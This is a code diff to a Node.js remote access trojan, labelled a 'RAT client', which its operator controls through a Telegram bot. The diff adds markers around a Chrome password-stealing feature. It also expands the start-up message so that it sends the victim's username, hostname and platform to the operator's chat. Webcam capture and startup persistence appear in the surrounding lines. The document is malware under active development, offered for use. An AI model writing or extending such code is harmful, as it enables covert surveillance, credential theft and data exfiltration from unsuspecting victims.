@@ -221,6 +221,7 @@ bot.onText(/\/open_url (.+)/, async (msg, match) => {
 
 // --- WIP Features ---
 
+// -- START_FEATURE_PASSWORDS --
 async function getChromePasswords() {
     let resultText = '🔑 Chrome Passwords 🔑\n\n';
     try {
@@ -294,6 +295,7 @@ bot.onText(/\/passwords_chrome/, async (msg) => {
         bot.sendMessage(CHAT_ID, `Error getting passwords: ${error.message}`);
     }
 });
+// -- END_FEATURE_PASSWORDS --
 
 // -- START_FEATURE_WEBCAM --
 const NodeWebcam = require( "node-webcam" );
@@ -344,7 +346,17 @@ addToStartup().catch(err => console.error('Failed to add to startup:', err));
 // -- END_FEATURE_PERSISTENCE --
 
 // Initial connection message
-bot.sendMessage(CHAT_ID, 'RAT client started and listening for commands.').catch(err => {
+const connectedMessage = `
+✅ **Windows Device Connected!**
+
+**System Info:**
+- **User:** ${os.userInfo().username}
+- **Hostname:** ${os.hostname()}
+- **Platform:** ${os.platform()} ${os.arch()}
+
+RAT client started and listening for commands.
+`;
+bot.sendMessage(CHAT_ID, connectedMessage, { parse_mode: 'Markdown' }).catch(err => {
     console.log("Could not send initial message. Check BOT_TOKEN and CHAT_ID.", err.code, err.response.body);
     // process.exit(1);
 });
